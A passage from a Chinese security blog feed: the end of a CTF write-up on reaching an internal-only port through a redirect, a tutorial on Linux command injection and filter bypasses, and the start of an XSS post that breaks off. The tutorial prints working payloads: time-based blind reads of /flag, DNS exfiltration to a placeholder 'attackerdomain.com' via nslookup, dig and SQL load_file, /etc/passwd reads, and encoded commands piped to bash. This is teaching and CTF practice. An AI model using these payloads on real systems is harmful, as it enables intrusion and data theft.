src="/./../images/posts/ImaginaryWeb/image-20240731165330988.png"></p><p>问题：3000端口只允许内网，为什么重定向可以成功访问3000端口？</p><p>回答：</p><blockquote><p>重定向通常不会改变发送者的IP地址。重定向是指将请求从一个URL转到另一个URL，发送者的IP地址在这个过程中保持不变。不过，如果重定向涉及到跨不同的代理或网络，可能会有不同的IP地址被记录，但在客户端到服务器的直接连接中，发送者的IP保持不变。</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>思路</strong></p><p>4000端口严格限制<code>flag</code>字符，虽然3000端口没有做过滤，可是3000端口只能通过内网访问。</p><p>没思路了？想想内网访问的本质：</p><p>内网访问的本质是发送者的<code>IP</code>地址必须属于内网范围。对于本题而言，只有当我们的<code>IP</code>是<code>localhost:4000</code>时才能访问3000端口。</p><p>我们既希望<code>IP</code>不变，又希望先拿一个<code>URL</code>骗过检测，最后希望目标<code>URL</code>转变成访问<code>flag.txt</code>，重定向可以解决这三个问题：</p><ul><li>重定向不改变发送者的<code>IP</code>，保证了数据传输在内网中。</li><li>重定向改变了目标URL，可以绕过限制，间接访问<code>flag.txt</code>。</li></ul><p><strong>进阶</strong></p><p>我还学会了通过修改本地的题目源码，在docker的日志上调试信息。</p><p>这个方法其实也简单，加上几行<code>JavaScript</code>的日志写入函数，重启一下容器即可。</p><p>但是这个方法对于分析题目极为有用，一定要善于使用</p><h1 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h1><p>经验与思维缺一不可！这两个方面都要重点培养。如果你有耐心看到这里，你不难明白我认知的转变，我相信你也会从之受益。</p><p>多打<code>CTF</code>，多思考，多积累，多坚持！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ImaginaryCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令注入入门</title>
      <link href="/2024/07/25/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/"/>
      <url>/2024/07/25/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-文章前言"><a href="#0x00-文章前言" class="headerlink" title="0x00 文章前言"></a>0x00 文章前言</h1><p>隔了这么久才写这一篇，其实还是比较惭愧的。本篇文章会尽量写的成体系，但是重点在于绕过。</p><h1 id="0x01-基础概念"><a href="#0x01-基础概念" class="headerlink" title="0x01 基础概念"></a>0x01 基础概念</h1><p>命令注入，一般是Linux命令注入，本文也以Linux命令注入为主。</p><h2 id="符号概念"><a href="#符号概念" class="headerlink" title="符号概念"></a>符号概念</h2><h3 id="管道符号"><a href="#管道符号" class="headerlink" title="| (管道符号)"></a>| (管道符号)</h3><blockquote><p>用于将一个命令的输出作为另一个命令的输入</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">comand1 | comand2</span><br><span class="line"><span class="built_in">cat</span> pax.txt | <span class="built_in">base64</span></span><br></pre></td></tr></table></figure><h3 id="and符"><a href="#and符" class="headerlink" title="&amp; (and符)"></a>&amp; (and符)</h3><blockquote><p>用于将多个命令组合在一起使它们可以同时执行而不需要等待前一个命令的完成</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp; command2</span><br></pre></td></tr></table></figure><h3 id="逻辑与"><a href="#逻辑与" class="headerlink" title="&amp;&amp; (逻辑与)"></a>&amp;&amp; (逻辑与)</h3><blockquote><p>用于在命令行中执行多个命令并且只有前一个命令成功执行(返回退出码为0)时才会执行下一个命令</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 ...]</span><br></pre></td></tr></table></figure><h3 id="逻辑或"><a href="#逻辑或" class="headerlink" title="||(逻辑或)"></a>||(逻辑或)</h3><blockquote><p>用于在命令行中执行多个命令并且只有前一个命令执行失败(返回退出码非零)时才会执行下一个命令</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 || command2 [|| command3 ...]</span><br></pre></td></tr></table></figure><h3 id="分号"><a href="#分号" class="headerlink" title=";(分号)"></a>;(分号)</h3><blockquote><p>用于分隔多个命令，使它们按顺序依次执行，无论前一个命令是否成功执行，分号后面的命令都会被执行</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 ; command2  [; command3 ...]</span><br></pre></td></tr></table></figure><h3 id="反引号-与"><a href="#反引号-与" class="headerlink" title="&#96;&#96;(反引号)与$()"></a>&#96;&#96;(反引号)与$()</h3><blockquote><p>用于执行命令并将命令的输出结果嵌入到另一个命令或上下文中</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command1 \`command2\`</span><br><span class="line"><span class="built_in">ls</span> \`<span class="built_in">echo</span> /etc\`</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 \$(command2)</span><br></pre></td></tr></table></figure><h3 id="和"><a href="#和" class="headerlink" title="()和{}"></a>()和{}</h3><h4 id="括号"><a href="#括号" class="headerlink" title="括号()"></a>括号()</h4><ul><li>命令分组：括号中的命令会作为一个独立的子进程在一个子shell 中执行</li><li>变量赋值：可以将括号中的命令的输出结果赋值给变量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(command1; command2)</span><br></pre></td></tr></table></figure><p>将这两个命令放置在括号()中，它们会作为一个独立的子进程在一个子shell中执行</p><h4 id="花括号"><a href="#花括号" class="headerlink" title="花括号{}"></a>花括号{}</h4><p>花括号中可以包含一个或多个值并以逗号分隔，在命令行中花括号会展开成多个值用于生成多个命令或参数的组合</p><p>exp1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &#123;1..5&#125;</span><br></pre></td></tr></table></figure><p>当执行命令时花括号会展开成多个值，即1 2 3 4 5并作为参数传递给echo命令</p><p>exp2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> file&#123;.txt,.bak&#125;</span><br></pre></td></tr></table></figure><p>当执行命令时花括号会展开成两个值，即<code>file.txt</code>和<code>file.bak</code>并作为参数传递给cp命令。但是这两个文件必须存在，不然会报错。</p><h2 id="文件描述"><a href="#文件描述" class="headerlink" title="文件描述"></a>文件描述</h2><blockquote><p>在Linux中文件描述符(File Descriptor)是用于标识和访问打开文件或输入&#x2F;输出设备的整数值，每个打开的文件或设备都会被分配一个唯一的文件描述符，Linux 中的文件描述符使用非负整数值</p></blockquote><p>了解下面三个：</p><ul><li>标准输入(stdin)：文件描述符为0，通常关联着终端键盘输入</li><li>标准输出(stdout)：文件描述符为1，通常关联着终端屏幕输出</li><li>标准错误(stderr)：文件描述符为2，通常关联着终端屏幕输出</li></ul><p>另外，平时使用的”&lt;”和”&gt;”相当于使用”0&lt;”和”1&gt;”</p><p>常见示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cmd &gt; file          将输出重定向到file</span><br><span class="line">cmd &lt; file          将输入重定向到file</span><br><span class="line">cmd &gt;&gt; file         将输出以追加的方式重定向到file</span><br><span class="line">cmd &lt;&lt; <span class="string">file         将文本内容作为输入</span></span><br><span class="line"><span class="string">cmd &lt;&gt; file</span>         以读写模式把文件file重定向到输入</span><br><span class="line">cmd &gt;| file         将命令的标准输出强制覆盖写入到文件中，即使文件已经存在并且具有写保护</span><br><span class="line">: &gt; filename        将文件filename截断为0长度，如果文件不存在, 那么就创建一个0长度的文件</span><br><span class="line">cmd &gt;&amp;n             将命令的标准输出和标准错误输出都重定向到文件描述符n</span><br><span class="line">cmd m&gt;&amp;n            将一个文件描述符m重定向到另一个文件描述符n</span><br><span class="line">cmd &gt;&amp;-             关闭标准输出</span><br><span class="line">cmd &lt;&amp;n             输入来自文件描述符n* cmd m&lt;&amp;n  m来自文件描述各个n</span><br><span class="line">cmd &lt;&amp;-             关闭命令的标准输入文件描述符</span><br><span class="line">cmd &lt;&amp;n-            将命令的标准输入重定向自文件描述符n并关闭该文件描述符</span><br><span class="line">cmd &gt;&amp;n-            将命令的标准输出和标准错误输出都重定向到文件描述符n并关闭该文件描述符</span><br></pre></td></tr></table></figure><p>本文就不说正则了。</p><h1 id="0x02-注入类型"><a href="#0x02-注入类型" class="headerlink" title="0x02 注入类型"></a>0x02 注入类型</h1><p><em>根据有无回显可以分为常规注入和盲注。</em></p><h2 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h2><p>这里不细说，注意一下ping测试、Trace测试等功能或者与IP地址有关的参数。</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注的结果不会回显，对此我们需要先判断盲注是否存在，再想办法得到盲注的结果。</p><h3 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h3><p>可以通过<strong>时间延迟</strong>判断盲注是否存在，以及盲注。</p><p><strong>payload</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> $(<span class="built_in">cat</span> /flag | <span class="built_in">cut</span> -c1 | <span class="built_in">tr</span> f 4)</span><br></pre></td></tr></table></figure><p>解释：</p><ol><li>读取 <code>/flag.txt</code> 文件的内容。</li><li>提取每行的第一个字符。</li><li>将字符 <code>f</code> 替换为 <code>4</code>。</li><li>使用替换后的结果作为 <code>sleep</code> 命令的参数。</li></ol><p>写个脚本，或者bp爆破都可以。原理上与SQL时间盲注一致。</p><h3 id="数据写入"><a href="#数据写入" class="headerlink" title="数据写入"></a>数据写入</h3><p>如果存在盲注，可以将数据写入到有写入和访问权限的文件，再访问这些文件即可得到数据。</p><p>上述方法的本质是将输出流重定向到可以访问的文件。</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pax &gt; /var/www/static/handsome.txt </span><br></pre></td></tr></table></figure><h3 id="OOB之DNS"><a href="#OOB之DNS" class="headerlink" title="OOB之DNS"></a>OOB之DNS</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>简单介绍一<code>OOB</code>（<code>Out-of-Band</code>，带外通道技术）：<code>DNS</code>数据外带（<code>DNS Exfiltration</code>）。</p><p>我们需要注册域名，配置<code>DNS</code>解析服务器，以得到日志文件记录的所有<code>DNS</code>查询请求。</p><p>日志会记录域名下的子域名信息。如果子域名设置成目标数据，那么数据就被成功带出来了。例如，如果目标系统发送了一个<code>DNS</code>查询请求 <code>data.mydomain.com</code>，攻击者可以从中提取出数据库的版本信息 <code>data</code>。</p><p>以<code>SQL</code>注入为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION SELECT 1, load_file(concat(&#x27;\\\\&#x27;,@@version,&#x27;.attackerdomain.com\\&#x27;)), 3 -- </span><br></pre></td></tr></table></figure><ul><li><p><strong><code>load_file</code></strong>:MySQL中的一个函数，用于从服务器的文件系统加载数据。尽管这个函数通常用于读取文件，但在这里，我们利用它来触发外部通信。</p></li><li><p><strong><code>concat(&#39;\\\\&#39;,@@version,&#39;.attackerdomain.com\\&#39;)</code></strong>:</p><ul><li><p><code>@@version</code> 是<code>MySQL</code>的一个全局变量，包含数据库服务器的版本信息。</p></li><li><p><code>concat</code> 函数用于将字符串连接在一起。这里我们将数据库版本信息与攻击者控制的域名拼接在一起。</p></li><li><p><code>\\\\</code> 是转义字符，它在<code>SQL</code>语句中表示一个反斜杠（\）。最终生成的字符串形式为 <code>\\version_number.attackerdomain.com\</code>。</p></li></ul></li></ul><p>数据库服务器在尝试处理这个路径时:<code>\\version_number.attackerdomain.com\</code>，可能会发出<code>DNS</code>查询 <code>5.7.21.attackerdomain.com</code>，从而将数据库版本信息泄露给攻击者控制的<code>DNS</code>服务器。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>命令注入一般在Linux环境，使用<code>nslookup</code> 或 <code>dig</code>查询<code>DNS</code>：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slookup $(uname -a).attackerdomain.com</span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dig</span> $(uname -<span class="keyword">a</span>).attackerdomain.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><p>还可以通过许多种方法实现DNS外带，不要局限于某种思路。</p><h1 id="0x03-过滤绕过"><a href="#0x03-过滤绕过" class="headerlink" title="0x03 过滤绕过"></a>0x03 过滤绕过</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h3><blockquote><p>在Linux中$IFS是一个环境变量，表示”Internal Field Separator”(内部字段分隔符)，它用于指定命令行参数和输入流中字段(单词)之间的分隔符，默认情况下其值为包含空格、制表符和换行符的字符串</p></blockquote><p>exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/flag</span><br></pre></td></tr></table></figure><h3 id="重定向符绕过"><a href="#重定向符绕过" class="headerlink" title="重定向符绕过(&lt;&gt;)"></a>重定向符绕过(&lt;&gt;)</h3><p>exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;&gt;flag.txt</span><br><span class="line"><span class="built_in">cat</span>&lt;flag.txt</span><br></pre></td></tr></table></figure><h3 id="09-需要php环境"><a href="#09-需要php环境" class="headerlink" title="%09(需要php环境)"></a>%09(需要php环境)</h3><p><code>php</code>环境下<code>web</code>输入<code>%09</code>等效于空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%<span class="number">09</span>flag.txt</span><br></pre></td></tr></table></figure><h3 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h3><p>exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X=$<span class="string">&#x27;cat\x20/etc/passwd&#x27;</span>&amp;&amp;<span class="variable">$X</span></span><br></pre></td></tr></table></figure><p>讲讲这段指令的语法：</p><p>第一个**$**：允许反斜杠后面跟着一个十六进制值来表示特殊字符或ASCII码，这种写法允许<code>\x20</code>表示为空格。</p><p>第一个**$**：执行变量 <code>x</code> 中保存的命令 <code>cat /etc/passwd</code>。</p><h3 id="换行拼接"><a href="#换行拼接" class="headerlink" title="换行拼接"></a>换行拼接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat\</span></span><br><span class="line">&gt;\</span><br><span class="line">&gt;pax.txt</span><br><span class="line"></span><br><span class="line">Pax is man!</span><br></pre></td></tr></table></figure><p>比较抽象</p><h2 id="过滤斜杠"><a href="#过滤斜杠" class="headerlink" title="过滤斜杠"></a>过滤斜杠</h2><h4 id="HOME-0-1"><a href="#HOME-0-1" class="headerlink" title="${HOME:0:1}"></a>${HOME:0:1}</h4><blockquote><p><code>$&#123;HOME:0:1&#125;</code> 是一个 Bash 字符串切片的语法。</p><ul><li><code>$&#123;HOME&#125;</code> 代表环境变量 <code>HOME</code> 的值，通常是用户的主目录路径。</li><li><code>:0:1</code> 表示从字符串的第 0 个字符开始，提取 1 个字符。</li></ul></blockquote><p>exp(<code>HOME</code>小写好像也可以)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd ----&gt;&gt;&gt; <span class="built_in">cat</span> <span class="variable">$&#123;HOME:0:1&#125;</span>etc<span class="variable">$&#123;HOME:0:1&#125;</span>passwd</span><br></pre></td></tr></table></figure><h4 id="echo-tr-‘-0’-‘“-1’"><a href="#echo-tr-‘-0’-‘“-1’" class="headerlink" title="$(echo . | tr ‘!-0’ ‘“-1’)"></a>$(echo . | tr ‘!-0’ ‘“-1’)</h4><p>直接拿来用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> $(<span class="built_in">echo</span> . | <span class="built_in">tr</span> <span class="string">&#x27;!-0&#x27;</span> <span class="string">&#x27;&quot;-1&#x27;</span>)etc$(<span class="built_in">echo</span> . | <span class="built_in">tr</span> <span class="string">&#x27;!-0&#x27;</span> <span class="string">&#x27;&quot;-1&#x27;</span>)passwd</span><br></pre></td></tr></table></figure><h2 id="长度检测"><a href="#长度检测" class="headerlink" title="长度检测"></a>长度检测</h2><p>后端有时会检测和限制长度。</p><h3 id="写入目录"><a href="#写入目录" class="headerlink" title="写入目录"></a>写入目录</h3><p>真的麻烦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&gt;cat\</span></span><br><span class="line">&gt;<span class="string">&#x27; &#x27;</span>\pax.txt</span><br><span class="line"><span class="comment">###############此时就有一个文件：cat pax.txt</span></span><br><span class="line"><span class="comment">#ls &gt; a</span></span><br><span class="line"><span class="comment">#$(sed -n &#x27;4p&#x27; /a)</span></span><br></pre></td></tr></table></figure><h3 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#ca\</span><br><span class="line">\t\</span><br><span class="line">\ \#############斜杠前有一个空格</span><br><span class="line">\flag.txt</span><br></pre></td></tr></table></figure><h2 id="黑名单类"><a href="#黑名单类" class="headerlink" title="黑名单类"></a>黑名单类</h2><p><em>如果一些关键字被过滤了呢？</em></p><h3 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h3><p>使用shell变量拼接指令</p><p>exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;e=.txt;$a<span class="variable">$b</span> $c$d<span class="variable">$e</span></span><br><span class="line">a=ca;b=t;c=<span class="string">&#x27; &#x27;</span> ;d=/flag.txt;$a$b$c<span class="variable">$d</span></span><br></pre></td></tr></table></figure><h3 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWcudHh0Cg==&quot;</span> | <span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWcudHh0Cg==&quot;</span> | <span class="built_in">base64</span> -d | bash</span><br></pre></td></tr></table></figure><h3 id="其他进制"><a href="#其他进制" class="headerlink" title="其他进制"></a>其他进制</h3><p>十六进制：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cat flag.txt&#x27;</span> |xxd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;0x63617420666c61672e7478740a&quot;</span> | xxd -r -p | bash</span><br></pre></td></tr></table></figure><p>八进制：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cat flag.txt&quot;</span> | <span class="built_in">od</span> -An -t o1</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\143\141\164\040\146\154\141\147\056\164\170\164\012&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="通配符类"><a href="#通配符类" class="headerlink" title="通配符类"></a>通配符类</h3><table><thead><tr><th align="center">通配符</th><th align="center">指令</th></tr></thead><tbody><tr><td align="center"><code>?</code></td><td align="center"><code>cat /f?ag.txt</code></td></tr><tr><td align="center"><code>*</code></td><td align="center"><code>cat /f*</code></td></tr><tr><td align="center"><code>[]</code></td><td align="center"><code>cat /fl[abcd]g.txt</code></td></tr><tr><td align="center"><code>&#123;&#125;</code></td><td align="center"><code>cat fl&#123;a,b,c,d&#125;g.txt</code></td></tr></tbody></table><h3 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h3><p><img src="/./../images/posts/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/p1.png"></p><p>一般利用<code>$1</code>,<code>$@</code>等值为空的变量与<code>payload</code>拼接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /fl<span class="variable">$1ag</span>.txt</span><br></pre></td></tr></table></figure><h3 id="反斜杠类"><a href="#反斜杠类" class="headerlink" title="反斜杠类"></a>反斜杠类</h3><blockquote><p>命令行解释器（如 Bash）通常不自动解析转义字符，除非在特定的上下文中（例如在某些编程语言中）</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t fla\g.txt</span><br></pre></td></tr></table></figure><h3 id="巧用引号"><a href="#巧用引号" class="headerlink" title="巧用引号"></a>巧用引号</h3><p>exp：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ca</span><span class="string">&quot;&quot;</span>t fla<span class="string">&quot;&quot;</span>g.txt</span><br><span class="line"><span class="keyword">ca</span><span class="string">&#x27;&#x27;</span>t fla<span class="string">&#x27;&#x27;</span>g.txt</span><br><span class="line"><span class="keyword">ca</span><span class="string">&quot;&quot;</span>t fla<span class="string">&#x27;&#x27;</span>g.txt</span><br></pre></td></tr></table></figure><h3 id="命令代替"><a href="#命令代替" class="headerlink" title="命令代替"></a>命令代替</h3><p>多见多记</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>                 从第一行开始显示内容，并将所有内容输出</span><br><span class="line"><span class="built_in">tac</span>                 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more                根据窗口大小，一页一页的显示文件内容</span><br><span class="line">less                根据窗口大小，显示文件内容</span><br><span class="line"><span class="built_in">head</span>                用于显示头几行</span><br><span class="line"><span class="built_in">tail</span>                用于显示最后几行</span><br><span class="line"><span class="built_in">nl</span>                  类似于<span class="built_in">cat</span> -n，显示时输出行号</span><br><span class="line">tailf               类似于<span class="built_in">tail</span> -f</span><br><span class="line"><span class="built_in">sort</span>                读文件</span><br></pre></td></tr></table></figure><h1 id="0x04-真题练习"><a href="#0x04-真题练习" class="headerlink" title="0x04 真题练习"></a>0x04 真题练习</h1><p><code>CTFHub</code>技能树RCE-&gt;命令注入-&gt;综合过滤练习</p><p><img src="/./../images/posts/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/p2.png"></p><p>过滤运算符、过滤目录分隔符、过滤反斜杠、过滤空格、过滤封号、过滤cat、过滤关键字flag和ctfhub</p><p>难点：分号**;**怎么替代？</p><p>答：<code>%0a</code>（经过<code>URL</code>编码的<code>PHP</code>换行符）可以代替分号**;**</p><p>第一步：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>%<span class="number">0</span>als</span><br></pre></td></tr></table></figure><p>发现目录<code>flag_is_here</code></p><p>第二步：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>%<span class="number">0</span>als<span class="variable">$&#123;IFS&#125;</span>fl?g_is_here</span><br></pre></td></tr></table></figure><p>发现文件<code>flag_230191972813921.php</code></p><p>第三步：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>%<span class="number">0</span>acd<span class="variable">$&#123;IFS&#125;</span>fl?g_is_here%<span class="number">0</span>atac<span class="variable">$&#123;IFS&#125;</span>fl?g_230191972813921.php</span><br></pre></td></tr></table></figure><p>成功得到<code>Flag</code>。其实方法千千万，不要局限自己的思路。</p><h1 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h1><ul><li><p><a href="https://coomrade.github.io/2018/09/12/time-base-order-injection/">https://coomrade.github.io/2018/09/12/time-base-order-injection/</a></p></li><li><p><a href="https://xz.aliyun.com/t/13829">https://xz.aliyun.com/t/13829</a></p></li><li><p><a href="https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93">https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93</a></p></li><li><p><a href="https://xz.aliyun.com/t/2957?time__1311=n4+xni0=i=DtitDO8KDsD7ffYg1xuD67D7TwID">https://xz.aliyun.com/t/2957?time__1311=n4%2Bxni0%3Di%3DDtitDO8KDsD7ffYg1xuD67D7TwID</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 命令注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析各类型XSS原理</title>
      <link href="/2024/07/24/%E6%B5%85%E6%9E%90%E5%90%84%E7%B1%BB%E5%9E%8BXSS%E5%8E%9F%E7%90%86/"/>
      <url>/2024/07/24/%E6%B5%85%E6%9E%90%E5%90%84%E7%B1%BB%E5%9E%8BXSS%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>把CTFHub技能树的XSS题目刷完了，也觉得需要对XSS有原理上的了解。本质学习有以下目标：</p><ul><li><input disabled="" type="checkbox"> 各种类型的XSS的原理</li><li><input disabled="" type="checkbox"> 各种类型的XSS的异同</li><li><input disabled="" type="checkbox"> XSS的防范措施</li></ul><p>推荐文章：<a href="https://cloud.tencent.com/developer/article/1768520">这一次，彻底理解XSS攻击-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p><code>XSS（Cross-site scripting）</code>，跨站脚本攻击。</p><ul><li><p>攻击原理：前端被插入精心构造的恶意代码，以实现攻击者的目的。从本质上来看，这样的输入流不再是纯净的数据流，可以影响到控制流。</p></li><li><p>攻击手段：一般是<code>JavaScript</code>，还有<code>Java</code>、 <code>VBScript</code>、 <code>LiveScript</code>、<code>ActiveX</code>、 <code>Flash</code> 甚至是普通的<code>HTML</code>。</p></li><li><p>XSS类型：<strong>反射型（非持久型）XSS</strong>、<strong>存储型（持久型）XSS</strong>、<strong>DOM型XSS</strong>、<strong>通用型XSS</strong>、<strong>突变型XSS</strong>。</p></li></ul><h1 id="0x02-反射型XSS"><a 